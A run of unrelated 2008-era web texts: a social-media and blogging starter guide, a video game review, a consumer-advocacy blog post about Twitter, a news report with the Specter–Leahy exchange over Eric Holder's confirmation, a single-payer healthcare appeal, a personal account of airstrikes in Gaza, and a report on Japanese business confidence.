“ Not only can you see Halle Berry , but you can see if she ’s angry or if she ’s looking at you .
This is a circuit that ’s dedicated to faces , and it goes all the way from the back of the brain to the very front . ”
Such specialization for face processing is vital to our survival , Koch adds .
“ It does n’t matter if you ’re a baby , or an old person , or a nerd that stares at the floor .
You are a social creature , and faces are important . ”

For beginners starting out with social media
If you are going to start using social media , you should at least have an understanding of what it 's about .
Social media is not about the tools , the tools are only a facilitator .
Starting with the basics .
Roll your sleeves up , get dirty and stake your claim :
1 ) Register your domain name , preferably a dot com extension .
It 's also a good idea to register any variations and extensions of your domain name .
Do it sooner rather than later , or you might be negotiating with a domain squatter , paying a premium in the future , rather than pennies in the present .
2 ) Find a good , reliable web host , and do your homework .
Ask for referrals .
If you are just starting out , it 's okay and economical to go with the cheap shared hosting plan , I.E Godaddy .
Expect to upgrade to a mid level or higher hosting package within 90 days or less .
3 ) Install a blogging platform , preferably Wordpress .
Find and install the necessary plugins , themes and widgets .
Installing a caching - system plugin is also a good idea .
You need to optimize not only just for search engines , but also page loading time .
Find a simple theme and build around it .
KISS is always a good rule of thumb .
4 ) Customize your permalink structure immediately .
By default , WordPress uses web URLs which have question marks and lots of numbers in them .
This will severely limit the amount of traffic you will see from search engines .
Change your permalink formatting to the following markup : ( day and name ) yourblog.com/blog/2008/10/25/sample-post/
5 ) Create an about page .
Tell people what your blog is about , and most importantly what you 're about .
Put a nice head shot of yourself on the about or profile page .
Make sure to include any awards or recognition that may be relevant about the author .
Give people an email address to email you , rather than an online form .
Add your primary social networking badges and urls on your contact page .
Facebook , Linkedin and Twitter should be a starting point .
I would also create a blogroll .
It can be on your sidebar , or a separate page , but it should exist somewhere on your blog .
6 ) Install analytic software , such as Google Analytics .
It 's a good idea to have at least two stats packages installed and running .
All analytic software is not created equal , they all have the same purpose , but vary in their reporting and tracking methods .
Results will vary to an extent , comparison of multiple data sources is vital .
7 ) Give people the tools to promote your content .
Social promotional buttons make it easy for your visitors to Digg , StumbleUpon , and share your content .
Bring the good word back to your blog .
For instance , if you 're active on FriendFeed you should install the FriendFeed comments and likes plugin on your blog .
8 ) Establish a Feedburner account .
Provide easy visibility for new RSS subscribers , use text links in addition to graphics to promote your RSS feed
You can also add an email subscription form on your site .
People who do not use feed readers , will be emailed your latest postings .
9 ) Focus and be consistent with your blogging .
Most professional bloggers get paid per post .
Do n't be intimidated or feel forced to compete with them .
Work at your own pace .
Quality takes time , plain and simple .
10 ) Build as many social passports as possible .
Passports are basically the profiles that you build on the various social platforms .
These profiles all should be consistent , and most importantly point back to your blog or website .
The goal is to create as much organic link juice as possible .
The core target is search engines .
Consistently update these profiles , and use tools such as ping .fm to update them .
11 ) Leave thoughtful and constructive comments as much as possible on other blogs .
Do n't stop there , post comments on Facebook walls , FriendFeed , and Twitter .
This promotes good practices in social media , and it also gives you an opportunity for exposure and link placement .
This can lead into new networking opportunities and potential new friendships .
12 ) Establish and actively use your Google Reader account .
This perhaps is the most powerful tool in any social media arsenal besides a blog or microblogging platform , such as Twitter .
I will outline more in detail as we get further down the list .
13 ) Find the top 50 blogs in your space , and subscribe to their RSS feeds in Google Reader .
Consistently be on the lookout for new blogs , and the voices behind them .
14 ) At this point you should already have a Twitter account .
If not , establish one .
If your objective is personal branding , your Twitter username should be your name .
Otherwise you could brand your twitter username the same name as your blog .
Remember consistency with all your profiles is key .
15 ) Work smarter not harder .
Use the tools to help you manage and stay ahead of the pack .
16 ) Listen to what 's being said about you .
Create Google alerts to monitor for positive or negative chatter .
17 ) Link out as often as possible when the circumstances permit it .
If you are writing a post on a related subject , always look for a chance to reference a fellow bloggers work .
This is not only good blogging etiquette , but will also put you on that persons radar in a positive way .
18 ) Build relationships with key influencers in all the communities and platforms that you participate on .
Relationships take time to develop and grow in time .
One good example on how to do this , is listed above at # 17 .
19 ) The material that you create should be something that people want to share .
For the most part , it should be relevant to your networks ’ interests .
Create newsworthy , thoughtful , intelligent content that has immediate usefulness .
20 ) Become an expert in your field .
Try to align and surround yourself with the best tools , and people to accomplish this .
It 's all about networking , networking and networking .
Take it offline when permitting .
Organize local social media meetups and tweetups .
Make it an effort to attend trade shows when possible .
21 ) Do n't knock it until you tried it at least once .
Be open to trying new multimedia applications that enable self promotion , audience engagement , brand retention and participation .
Experiment with podcasting , creating video , slide shows , or creating and posting any type of original user generated content .
22 ) Solicit not only your peers for feedback , but your audience .
Ask your readers to submit feedback for site improvements , ideas on new topics to blog about , follow ups on previous topics , participation in polls etc .
23 ) Good content speaks for itself , and is recognized .
Let others promote your content and only promote your best stuff .
Ask your twitter followers to spread the word by re-tweeting good posts .
Be sure to do the same for others .
24 ) Promote others , even more than you promote yourself .
Practice this , and it will come back to you tenfold .
25 ) Use Google Reader to share and promote your own work , as well as your core networks content .
Do n't limit yourself , share complete strangers work too .
Good content needs to be rewarded , recognized and distributed through the appropriate channels and relevant communities .
26 ) Hopefully you will already have at least one active social bookmarking account established .
Delicious , Diigo , Ma.gnolia , any of these will do .
Open accounts on all three of these services .
Make Diigo your primary account for bookmarking .
By doing this , you can use a Diigo feature that allows you to bookmark to all three services simultaneously .
27 ) Establish accounts on Stumbleupon , and any social news sites such as Digg , Reddit and Mixx .
28 ) In addition to sharing content with Google Reader , be sure to StumbleUpon , good blogs , or websites .
StumbleUpon is key for traffic and exposure .
You can expect a large spike in traffic initially , then gradually it tapers off within a few days .
You can expect long term traffic from SU , albeit in dribs and drabs .
29 ) Tag your media , especially blog posts and bookmarks .
Social bookmarking , video and image sharing sites also serve as search engines , therefore tag accordingly .
The traffic comes in dribs and drabs , but it 's targeted traffic nonetheless .
Every click counts .
Same applies to any other forms of media you create , including videos you publish on Youtube , Vimeo .
Images you publish on Flickr , podcasts , etc .
30 ) Blog postings , bookmarks , Flickr images and so forth should all be imported into a social content aggregation site , such as FriendFeed.com
31 ) Be omnipresent on all the networks .
I should be able to find out about your latest happenings , and or statuses if I am browsing your Facebook profile , Linked profile , Twitter or FriendFeed stream .
32 ) Use the cloud to your benefit .
Work more efficiently by using online applications to manage and organize the workload .
33 ) Take full advantage of all the Google services that are offered .
Google Calendar , Google Docs , Google Notebook , Google Reader and so forth .
These services are all web based , and offer sharing and group collaborating features .
You can also import the data publicly via RSS , and an html page via your Google Reader shared link blog .
Bottom line is , most of your Google data is easily accessible , manageable and integrateable with the web .
34 ) It can take months even years to see successes .
Stay consistent and focused with your social media strategy .
Adapt when necessary , and do not be afraid to take calculated risks .
35 ) Do not ignore the simple concept of “ transparency . ”
Personalize your brand .
People relate to people much more effectively than they can a logo or commoditized brand .
Any additional thoughts ?

Because there 's no real sense of mortality , makes a dramatic departure from many of its genre counterparts .
There are no loading screens to break up gameplay when you accidentally send him to his maker .
Since there are no worries about having sand to rewind time or the dreadful notion of waiting to retry , it 's easier to jump back into the game from your last checkpoint and try again .
It 's a testament to this fluid feature that it never feels as though the game is holding your hand .
You 'll realize just how invaluable it is once you 've cleared a section of the game world and start collecting Light Seeds .
These luminescent orbs are the currency of 's world , and you 'll risk life ( well , not really ) and limb to collect them once Elika removes all of the darkness from that stage .
It 's in these sections that you 'll really get to test out your new platforming abilities and flirt with failure .
Although the PC version lacks any Windows Live achievements -- the console versions reward you for getting saved less than 100 times -- there 's still some challenge to trying to clear the game with the fewest amount of Elika rescues possible .
Besides functioning as a conduit to exploration , Elika is as much of a combatant in battles as the Prince .
continues the one - on - one combat of the later Sands of Time games and adds some unique flourishes .
Not only can the Prince slice at enemies with his sword or throw them skyward with his gauntlet , Elika can attack as part of his combos .
Combat was n't the strongest suit in the pasttitles , but it 's markedly improved here , thanks to Elika and some of the other elements .
Not only can you finish battles by pushing enemies off of ledges , you can unleash a variety of combos on them that feel a bit smoother than in any previous titles .
Blocks and parries take a little practice , but once you 've gotten the timing down , they 're fairly fluid and easy to pull off .
Boss fights are more exciting and engaging than in past titles thanks to this new fighting system .
It 's not just button taps that aid in the combat process .'s gorgeous cel - shaded animation -- lively and reminiscent of -- gives player and enemy movements a fluidity that makes it easier to see when you 're making a mistake , or when you 're able to find a window of opportunity to parry that sword attack .
The game 's visuals are tweaked to give you immediate feedback on the action :
Whenever the Prince makes a leap that could prove fatal , color desaturates .
As the screen goes black and white , you might have a split - second to summon Elika 's jump extension and save yourself .
It 's a small flourish that says volumes about 's blend of style and substance .
Although Ubisoft has caught its share of flak over the years , whether it's for lackluster PC ports that show up months after console release or games that release filled with unpopular DRM software , is just as good on your computer as it is on a console .
It controls just as well with a keyboard and mouse as with an Xbox 360 controller or DualShock 3 .
We ran it at a variety of settings , and it looked even more gorgeous than on Xbox 360 .
It 's also worth noting that the disc - based version of ( which we played for review ) does n't have any copy protection to stifle your system .
An Ubisoft rep told us that there will be copy protection for digital versions , although we found few details around the net on the eve of release .
It'd be a shame to callsimply another series reboot .
Truly great games of any genre assimilate proven ideas from other titles and introduce new ones .
In this case , the new title combines strong platforming fundamentals , 's open - world structure , and some of 's wonderful aesthetic flourishes .
What it introduces to action games is something truly wonderful .
Since the Prince can't die , the pace and rhythm of gameplay is never lost , yet it still offers a challenge even for hardcore gamers .
Elika is something of a semi-NPC , as you never fully control her , yet she 's a hugely integral part of the game experience , from rescues to combat .
With all of these ingredients -- both new and familiar -- mixed together , is undoubtedly one of the year 's finest games .
Last week , I read an interesting story on SEOmoz ( no really , it ’s applicable to people who do n’t even know what SEO means ! ) about getting better customer service through Twitter .
To summarize , Rebecca wanted to cancel a Comcast sports package .
She was told by the customer service representative ( CSR ) that she could n’t do so , even though the season had just started .
She could n’t even talk the CSR into a prorated refund .
Frustrated , Rebecca used Twitter to vent her annoyance .
Less than 12 minutes later , a Comcast representative tweeted back to her .
He asked about the problem and they discussed it .
Meanwhile , some of her followers responded to her initial tweet or even “ retweeted ” it ( to repost a tweet on your own twitter feed ) .
She and the twittering Comcast CSR eventually solved the problem and she got her refund .
Comcast was very smart to have people use Twitter to fix problems .
That really drove home to me the power of blogging and even twitter .
Twitter is essentially a micro blog , where anyone can publish their thoughts in 140 characters or less .
“ I hate comcast . ” takes only fifteen .
In some ways it ’s more egalitarian than blogs .
You do n’t need to pay a dime to set up an account and even attract a number of followers ( sure , you can do that on a WordPress.com or Blogger blog too , but Twitter accounts have the advantage of looking about the same ) .
A recent commenter on one of my articles about Direct Buy ( rather enthusiastically ) explained that Direct Buy had apparently bought out a site on infomercial scams , just to quash negative publicity .
Because that site was showing up # 2 in searches for Direct Buy .
Whether or not it ’s the case , it ’s certainly believable .
All in all , this is pretty good news for us consumers .
Sometimes CSRs are impossible to work with .
Even calling back may not help and may just feel like a waste of your time .
But in the ideal market , consumers have as much power as anyone .
And the internet is a great tool for using that power .
So if you ca n’t get through to a CSR , why not write a blog post about your experience ?
Or some tweets ?
Smart companies care about their reputation and would much rather have a negative blog post amended to say “ They helped me get everything fixed , awesome ! ” than have it showing up in potential customer ’s Twitter accounts or ranking for a search term on Google .
Then there ’s the old - fashioned method : write .
A real ink - and - paper letter .
Find information of someone important at the company –president , etc , and address it to them .
Or find / figure out their e-mail address ( look at any company e-mail addresses and figure out their method of handling names : j_smith , jsmith , smithjohn , etc. ) and e-mail the letter .
If you do have a blog / twitter account , mention that you plan to spread the word of how well or poorly they handled it , depending on the outcome .
As someone pointed out to Rebecca , ideally she ’d have gotten everything solved during the first phone call .
But since she did n’t , it ’s still much better that things are solved now than if they were n’t .
There ’s all kinds of power you have as a consumer , the key is using it .
Have I written a lot about Twitter lately ?
It ’s not intentional .
Judiciary senators spar over Obama AG nominee Nick Juliano
Published : Wednesday December 10 , 2008
Print This Email This Trouble is brewing over the confirmation of Barack Obama 's Attorney General nominee , with a prominent Republican indicating the party may try to hold up Eric Holder 's confirmation with questions about his involvement in a controversial pardon during the Clinton administration .
Sen. Arlen Specter ( R - PA ) , the ranking member of the Senate Judiciary Committee , called for a delay in Holder 's confirmation hearings because of troubling questions stemming from Holder 's role in the pardon of fugitive financier Marc Rich .
This led the committee 's chairman , Sen. Patrick Leahy ( D - VT ) , to fire off an agitated letter accusing his colleague of making unreasonable demands .
Leahy said he was " confounded " at Specter 's surprise that the Holder hearings had been scheduled for Jan. 8 , two days after the 111th Congress convenes .
Specter said Wednesday he did n't think the confirmation hearings could happen until Jan. 26 , a week after Obama 's inauguration , so Republicans could have ample time to review thousands of pages of documents and the nominee 's FBI background check .
" My recollection is that your initial reaction on November 18 was that you were at that time already reviewing his record , " Leahy wrote .
" Of course , Eric is someone you and I both know well and have known and worked with for years . "
Leahy noted that the Holder hearings were scheduled within a comparable time - frame of other Attorney General nominees .
While word began to leak that Holder would be the nominee in mid-November , Obama made the official announcement last week , more than a month before the hearing 's are scheduled .
Specter 's attempt to delay the hearings marks a shift from earlier statements on Holder .
Appearing on MSNBC on Nov. 19 , Specter voiced concern about the Rich pardons but specifically said he would not obstruct confirmation hearings .
" Would I hold it up ?
No , " He told Andrea Mitchell .
" I would be prepared to move ahead very promptly with hearings .
Move into the substance of the matter .
Ask the important questions .
Look for any documents that might be relevant .
" As fast as we can move through , I 'm prepared to decide it one way or another , " he continued .
" I would n't hold it up . "
It 's unclear what changed in the three weeks since that interview aired .
Leahy reminded Specter of the many areas the two had worked together in the past and stressed the need to move quickly to confirm Holder .
" No one has to remind either of us how decimated the Department of Justice has been during recent years or how important it is that it be restored .
I think you have called it dysfunctional , and said morale is in disarray , " Leahy wrote .
" We both know it is too important that it have its senior leadership in place without delay . "

A copy of Leahy 's letter and Specter 's floor speech are reprinted below :
Specter 's speech :
 Madam President , I further sought recognition to comment briefly about the scheduling of the hearing for Attorney General designate Eric Holder .
In looking toward the hearing process , I am looking for a very constructive engagement to determine the qualifications of Mr. Holder .
There is no intent on my part or on the part of any of my colleagues on the Republican side of the aisle to engage in partisan sniping .
As I say , we intend to be constructive and not destructive .
We are looking to strengthen the Department of Justice .
 The position of Attorney General is an extraordinarily important position .
We have seen that , during the administration of Attorney General Alberto Gonzales , stated candidly , the Department was not well handled .
That is a candid statement and also a very mild statement .
 During the course of Attorney General Gonzales ' tenure , there were so many situations where the Attorney General molded his views to accommodate his appointer , the President of the United States .
A great deal that went on in the Department of Justice was partisan and not in the interests of the work of the Department or in the interests of the American people .
 We have seen , since 9/11/2001 , a vast extension of Executive authority .
We found the terrorist surveillance program was initiated by the President without consultation under the tradition of notifying the chairman , which I was during the 109th Congress , or the ranking member .
We found there was an arrangement with the telephone companies to engage in electronic surveillance , again without notifying the chairman or ranking member of the Judiciary Committee and without notifying the intelligence committees of both Houses , as mandated by law .
Further was the expansion of signing statements , all during the tenure of the Attorney General .
 Without going into the issues of politicization , they were rampant during the tenure of Attorney General Gonzales .
I refer to an article , coauthored by the current chairman of the committee and myself , which appeared not too long ago in Politico , on October 28 , 2008 , where we said in part :
 The Attorney General must be someone who deeply appreciates and respects the work and commitment of the thousands of men and women who work in the branches and divisions of the Justice Department , day in and day out , without regard to politics or ideology , doing their best to enforce the law and promote justice . 
 With respect to Attorney General - designate Holder , there is no doubt he comes to this nomination with an outstanding record , for the most part .
Not without question , but for the most part .
He has an excellent educational background from Colombia : undergrad and law degree , a trial attorney in the Department of Justice , an associate judge of the Superior Court of the District of Columbia , U.S. attorney , Deputy Attorney General , Acting Attorney General -- a very distinguished resume , which I have recited .
 But there are questions which have to be inquired into fairly , as already noted in the commentaries of the media on the editorial pages .
There has been considerable publicity about the pardon of Marc Rich .
There was a case involving Mr. Rich , who was a fugitive , who had given very substantial sums of money to entities connected to the President .
The regular procedures for a pardon were bypassed .
The Department of Justice was not consulted .
The attorneys in the Southern District of New York , which was handling the Rich case , were opposed to the pardon .
 From my own days as district attorney of Philadelphia , where I dealt with celebrated cases involving people who were fugitives , who had fled , that is about as serious a matter as you could find and hardly one where there would be an expectation of leniency or pardon to wipe out the charge , eliminate the matter , while the defendant was in absentia .
 There was an extensive report filed on this issue by the House of Representatives Committee on Government Reform , the 107th Congress , second session .
It is available for anyone to read .
There are quite a number of very serious questions involving what happened with Mr. Holder and the people involved there .
 The concern that arises is why Mr. Holder lent the recommendation , which has been characterized as neutral leaning in favor ,  in this context .
I come to no conclusions on the matter .
I approach this matter , as I try to approach all matters , with an open mind .
But in an extensive interview with Mr. Holder he has presented his views .
I do n't think it is useful to get into the specifics as to the precise concerns which I raised and his precise answers .
Let that await a day where we have a hearing and where Mr. Holder is in a position to speak for himself .
But by analogy to the Gonzales tenure , I think it is imperative we be sure the Attorney General of the United States does not bend his views to accommodate his appointer ; that the Attorney General does not bend his views in any way which is partisan or political , to serve any interest other than the interests of justice .
 As noted in the article cited in Politico , where you have the professionals in the Department of Justice -- they would n't even meet with attorneys for Mr. Rich , they thought it was such an open - and - shut case , and were opposed -- at least according to information provided .
This is all to be brought out at a hearing .
But to run counter to the views of the professionals is a major red flag which has to be inquired into and inquired into with some depth .
 Then we have the situation where Attorney General Reno recused herself on the issue of appointing an independent counsel to investigate alleged -- and I emphasize alleged -- illegal fundraising by Vice President Albert Gore out of the White House .
There was the relatively notorious incident where the Vice President was at a meeting and drank a lot of ice tea and absented himself from certain parts of the meeting where he was not able to -- or had a rationale for not knowing certain things .
 I questioned Attorney General Reno in detail about that during Judiciary Committee hearings and she said :
 Well , there just was n't sufficient evidence . 
 She had disregarded a document , a note taken by someone present , because , as she said , it did not refresh that witness 's recollection .
I asked her about the doctrine of prior recollection recorded , which is a well - known exception to the hearsay rule .
She denied knowing about it .
 I note a frown on the face of the Presiding Officer , who was a distinguished district attorney herself .
Doubtless we could speak at length about prior recollection recorded .
I mention that because of the curious circumstances of what happened there .
There we had an assistant U.S. attorney named LaBella , who was asked to take on the job of making a recommendation .
According to the information provided to me , he made a recommendation for an independent counsel and the professionals in the Department asked for an independent counsel , and it was overruled .
 I am not going to comment about Mr. Holder 's role .
Let him respond to that and let us take that up in due course .
But here again is a potential situation where the interests of justice and objectivity were not followed in the highest levels of the Department of Justice when Mr. Holder was in charge , with the Attorney General , Attorney General Reno , having recused herself .
 There are many other matters which warrant inquiry , and I will not take the time to go into them now .
They are referenced in a letter which eight Republican members of the Senate Judiciary Committee sent to Attorney General Mukasey , requesting information from the Department of Justice files .
I ask unanimous consent that a copy of this letter be printed in the Record .
 When hearings were held for Attorney General Ashcroft , they were held from January 16 to January 19 of 2001 .
At that time , there were 2 days of testimony from Attorney General Ashcroft , and the committee heard from 23 outside witnesses .
May I remind everyone that John Ashcroft was a well - known person to the committee .
He had been in the Senate .
He had served on the Judiciary Committee .
We knew him very well .
But that did n't stop a very full , detailed inquiry .
It was not done in a rush .
 With respect to Mr. Holder 's situation , we have in the committee some 86 boxes of archived committee documents relating to Mr. Holder 's tenure in the Department of Justice .
We expect those materials to increase very substantially when we receive materials from the Department of Justice and the Clinton Library .
 Similar document requests were made to the Department of Justice in the Reagan Library during the confirmation of Chief Justice John Roberts , and they yielded some 65,000 additional pages of documents .
 As of the present time , we have not yet received Mr. Holder 's questionnaire , his nomination materials , or the FBI background investigation .
 I have taken the time to come to the floor to outline , very briefly , some of the issues .
They are set out in more detail in the letter , which is now made a part of the record , to Attorney General Mukasey , asking for specific matters regarding Mr. Holder .
There are other matters which are in the media which I think are better left for further investigation , even before the hearing , before there is any public comment about it .
But we are looking at a very major matter .
 The Department of Justice has enormous responsibilities in the battle against terrorism and in the protection of civil rights .
That is a balance which has to be maintained .
There are real questions as to whether it has been maintained since 9/11 .
Those are matters for inquiry .
 There are very substantial matters to be inquired into on the Justice Department position on waiver of attorney - client privilege , which started with the Holder memorandum when he was Deputy Attorney General and then went forward to the Thompson memorandum and the McNulty memorandum and so forth .
Also , there are major matters of legislation now pending on the subject of reporters ' shield , where the Department of Justice has taken a view which I believe has to be modified by legislation if we cannot get some accommodation with the Department .
 That is a very brief statement as to the issues which we are looking for .
As I look at this matter , it seems to me not realistic or fair to begin hearings before January 26 .
 The week of January 19 is going to be occupied with the inauguration .
And to have adequate time to prepare , it seems to me , that needs to be done .
When we had hearings involving Chief Justice Roberts and Associate Justice Alito , consideration was made of the minority point of view , and extensive discussions were had , and there was an accommodation and agreement reached as to when the hearing was to be held .
So we are looking at a serious matter and we have to do it right .
It is going to take some time . 
Leahy 's letter :
The Honorable Arlen Specter
Republican Ranking Member
Senate Committee on the Judiciary
152 Dirksen Senate Office Building
Washington , D.C. 20510
Dear Arlen :
As I hope you know , I honored your request and asked Secretary Rice to facilitate your 14 - day trip to 10 countries from December 25 through January 7 .
Please do let me know who the other Senators are who will be accompanying you .
I also wanted to respond to your letter of last evening .
I am a bit confounded as to why you are surprised that the Holder hearing was noticed for January 8 .
As I have said repeatedly from the time reports of his likely designation began appearing in the press in mid-November , I thought we should move promptly .
It hardly came as a surprise when the President - elect announced that Eric would be a key part of his national security team at the designation announcement on December 1 .
My recollection is that your initial reaction on November 18 was that you were at that time already reviewing his record .
Of course , Eric is someone you and I both know well and have known and worked with for years .
I made no secret of the need to move promptly to schedule this hearing from when I spoke about Eric Holder on the Senate floor on November 20 , when I held a press availability on December 1 , and when my chief counsel met with both your staff director and your chief counsel last week , I was hoping to hold the hearing on January 7 .
Initially , our staffs discussed possibly proceeding before Christmas if the designation were made around Thanksgiving .
We commence the new session on January 6 , but that day will be devoted to swearing in and recognizing the returning and newly elected Senators .
When you extended and expanded your travel plan to include January 7 , my staff made sure yours knew that such an extension would mean that you would miss the Holder hearing .
Your staff indicated that you would be calling me .
You did not , but sent back the message that you chose to extend your travel through January 7 .
I then learned that the Senate Republicans are planning a Republican caucus retreat for January 7 .
I respected your desired travel plans and the Republican Senate retreat by postponing the start of the hearings to January 8 .
I have sought to accommodate your interests on many occasions .
I scheduled field hearings for you in Pennsylvania on foreclosure and health care mergers issues , and worked hard to ensure fair treatment and confirmation for nominations in which you had a personal interest .
We worked in a bipartisan fashion last Congress to investigate the politicization of the Department and to expedite nominations to restock the leadership ranks at the Department after nearly every top official , including the Attorney General , resigned in the wake of the scandals .
I hope you will now join me to complete the hard work that must be done to right the ship at the Justice Department .
I will continue , as I always have , to work closely with you and Senators from both sides of the aisle to schedule consideration of both executive and judicial nominations and to make progress on our legislative agenda .
I look forward to working with you in the next Congress .
When Michael Mukasey was designated to be Alberto Gonzales successor last year , you urged that we move promptly on the confirmation proceedings .
I did not delay in scheduling that hearing , even though many were suggesting that I do so .
Instead , I proceeded promptly with a hearing 30 days after the nomination was announced .
For that , I received criticism from my side of the aisle .
Other Republican members of the Committee , at that time -- when President Bush was doing the designating -- urged speed and observed that the average time to a confirmation hearing for an Attorney General was three weeks .
They called for moving the nomination as quickly as possible  given the need for new leadership at the Justice Department , and a member of the Republican Senate leadership called for proceeding immediately . 
After the contentious 2000 presidential election , I also proceeded promptly to hold the hearing on the designation by President - elect Bush of John Ashcroft to be Attorney General .
Johns designation was not formally announced until December 22 , but I held his hearing 25 days later .
I do not think President - elect Obama should be penalized for proceeding promptly with transition and designating his Attorney General selection three weeks before President Bush had .
I am sure you recall during your first year in the Senate how promptly Chairman Thurmond proceeded on the designation of William French Smith to be Attorney General at the beginning of the Reagan administration .
The Committee completed its consideration of President Reagans lawyer to be the Attorney General of the United States with a vote on January 16 , even though he was not designated until December 11 .
We have known about Erics designation officially for 10 days , and unofficially for more than three weeks .
The Committee would have to vote on January 6 , the first day of the new Congress , to approximate that timeline .
President Carters first Attorney General , Griffin Bell , was not designated until December 18 , yet his hearing and Committee consideration were completed by January 19 .
Approximating that timeline would have the Committee voting before the new Congress even comes into session .
Recognizing the importance of the Attorney General of the United States , our Committee has customarily held hearings on a new Presidents pick before inauguration .
That was true of Attorney General Griffin Bell , Attorney General William French Smith , Attorney General Ashcroft and should hold true for the next Attorney General .
Other Attorney General nominations , which you and I have considered together , include that of your fellow Pennsylvanian , Dick Thornburgh , whose hearing was held 24 days after he was announced .
He remained in office when Vice President George H.W. Bush was elected President .
When he left the post toward the end of that administration , we proceeded with Bill Barr , whose hearing was held 25 days after he was announced .
The beginning of President Clintons administration was unusual , but when he settled on Janet Reno , her hearing was held 26 days after she was announced .
I want to be as fair to President - Elect Obama and his nominee as we have been to others .
I held hearing on President Bushs first Attorney General 25 days after he was designated and on the current Attorney General 30 days after he was designated .
I have noticed the hearing for the next Attorney General 39 days after he was officially designated and 52 days after your November 18 statement that you were already at work reviewing his record .
The need for new leadership at the Department of Justice is as critical today as it has ever been .
I want to respect the commitment made by the outgoing President to make the transition to the new administration a smooth and speedy one .
No one has to remind either of us how decimated the Department of Justice has been during recent years or how important it is that it be restored .
I think you have called it dysfunctional , and said morale is in disarray .
We both know it is too important that it have its senior leadership in place without delay .
The election of Barack Obama and Joe Biden , and the President - elects selection of Eric Holder , are an historic opportunity for the country to move past the partisanship of the past decades and work together to solve the nations problems , protect against serious threats and meet our challenges .
We both know these men .
They have long and distinguished records of service and accomplishments .
They can make a real difference if we join with them , not as Democrats or Republicans , but as Americans .
Sincerely ,
PATRICK LEAHY
Chairman
Dear Activists ,
President - elect Obama 's transition team says they want to hear from us on healthcare .
So , the time has come to rise up and speak up as never before .
Let 's contribute the single payer -- publicly funded , privately delivered -- healthcare message loud and clear .
Go to the change.gov site to sign up and host a health care community discussion .
If we 're going to have a seat at the discussion table , we 're going to have to invite our friends , neighbors and family , set the table and serve up the best option for this nation 's healthcare mess -- single - payer facts can be found here :
Now is the time for national single - payer health care , but it will take a movement to make single - payer health care equality a reality .
Happy Holidays ,
Jean Fox
Comment Below :
This contributor certainly has a strong perspective !
What is yours ?
What are the pros and cons of single - payer healthcare ?
Will it help or hurt our community ?
What are the alternatives ?
Agree or Disagree what will you be saying at your Heathcare Advisory Roundtable ?

We woke up this morning to the news in Gaza .
It seems we always wake up to news there - so its become a matter of perspective how bad the news is each time ; how remote it seems each time ; how real or not ; how severe - and whether the severity warrants an " international outcry " or whether the animals can continue to fester in their cages for a while longer .
We received a call from my in - laws in Lebanon 's Baalbeck refugee camp at an early hour , checking in on my family in Gaza , since they cannot call them directly .
We call my parents .
My father does not answer .
We call his mobile - we reach him .
He has just returned from Shifa hospital - we hold our breaths .
" We are OK .
We went to donate blood and to see if they needed any help " says my father , a retired surgeon .
" I was out in thewhen the strikes began - I saw the missiles falling and prayed ; the earth shook ; the smoke rose ; the ambulances screamed " he said , the sirens audible in the background .
he was onstreet at the time of the attacks , just a few streets down from one of the attack sites .
My mother was in the Red Crescent Society clinic near the universities at the time of the initial wave of attacks , where she works part - time as a pediatrician .
Behind the clinic was one of the police centers that was leveled .
She said she broke down at first , the sheer proximity of the attacks having shaken her from the inside out .
After she got a hold of herself , they took to treating injured victims of the attack , before they transferred them to Shifa hospital .
There , she said , medical supplies were in short supply : face masks , surgical gloves , gowns ...
My parents live in the the city center , and the Israeli war planes attacked people and locations all around them .
Over 50 " targets " by 60 warplanes , read the headlines in Haaretz .
And over 220 killed - in broad daylight ; in the after - school rush .
Like a movie tagline .
Or a game .
If you say it enough times , it does not sound real anymore : 50 targets , 60 warplanes , 200 people , 1 day .
All very sanitary .
Very sleek .
Neatly packaged : war in a gift - box .
" There is a funeral passing every minute .
The bodies are piling up . "
Gaza 's air is saturated with the smell of burning human flesh .
There is panic , as one would imagine dogs would panic in an overcrowded cell when several of their own are violently , abruptly killed .
But dead dogs - in a cage , no less , would create an outcry .
The rains of death continue to fall in Gaza .
And silently , we watch .
and silently , governments plotted : how shall we make the thunder and clouds rain death onto Gaza ?
Egypt ; the United States ; Israel ...
And it will all seem , in the end of the day , that they are somehow a response to something .
As though the situation were not only acceptable - but normal , stable , in the period prior to whatever this is a response to .
As though settlements did not continue to expand ; walls did not continue to extend and choke lands and lives ; families and friends were not dislocated ; life was not paralyzed ; people were not exterminated ; borders were not sealed and food and light and fuel were in fair supply .
But it is the prisoners ' burden to bear : they broke the conditions of their incarceration .
They deviated .
But nevertheless , there are concerns for the " humanitarian situation " : as long as they do not starve , everything is ok .
Replenish the wheat stocks immediately .
The warden improves the living conditions now and then , in varying degrees of relatively , but the prison doors remain sealed .
And so when there are 20 hours of power outages in a row , the prisoners wish that they were only 8 ; or 10 ; and dream of the days of 4 .

Confidence among Japanese businesses fell at its fastest rate for more than three decades in the last quarter , figures out today showed , as the country 's top banker warned that the economy could continue to shrink for at least another year .
In its quarterly " tankan " survey , the Bank of Japan [ BoJ ] said the confidence index among major manufacturers had plummeted from - 3 to - 24 in the three months to December , its biggest drop since February 1975 .
The sharp rise of the yen and the global financial crisis have pummelled Japanese car and electronics makers , dragging confidence levels to their lowest since the dog days of early 2002 , when it stood at - 38 .
The survey asked more than 10,000 businesses whether they view the economic climate in a favourable or gloomy light – a negative reading indicates that pessimists outnumber optimists .
The financial crisis has forced Japan 's manufacturers to revise earnings forecasts , slash jobs and lower production .
Last week Sony said it would cut 8,000 jobs worldwide , while Toyota estimates its net profit for this year will be a mere third of last year 's earnings .
The strength of the yen , which reached a 13 - year - high against the dollar last Friday , could force exporters to cut more jobs and reduce capital spending and output even further , analysts warned .
Opinions are divided over the central bank 's response when its policy board meets later this week .
While there is speculation it will cut interest rates to encourage borrowing and investment , the consensus is that rates will stay at 0.3 % until around March next year .
Instead , the central bank may opt to pump more liquidity into the financial system to encourage lending , Takuji Okubo , an economist at Merrill Lynch , told the Associated Press .
" As interest rates get close to zero , there is really no incentive for people to trade in the money market , " he said .
" That 's why the BoJ wants to keep at least some interest , to keep people trading . "
The tankan results are further proof that Japan 's recession is far worse than previously feared .
The world 's second biggest economy has contracted for two straight quarters , with some fearing that the slowdown could continue into the first quarter of next year .
That would mark the first time the economy has declined for four straight quarters since the end of the war .
Last week the prime minister , Taro Aso , responded with a stimulus package worth ¥ 23 trillion ( £ 169 bn ) in an attempt , he said , to drag Japan out of a financial maelstrom felt " only once every hundred years " .
But in a newspaper interview published today , the BoJ governor , Masaaki Shirakawa , warned that the economy could continue to shrink for at least another year through to the end of March 2010 .
The bank had originally forecast modest growth for the next fiscal year .
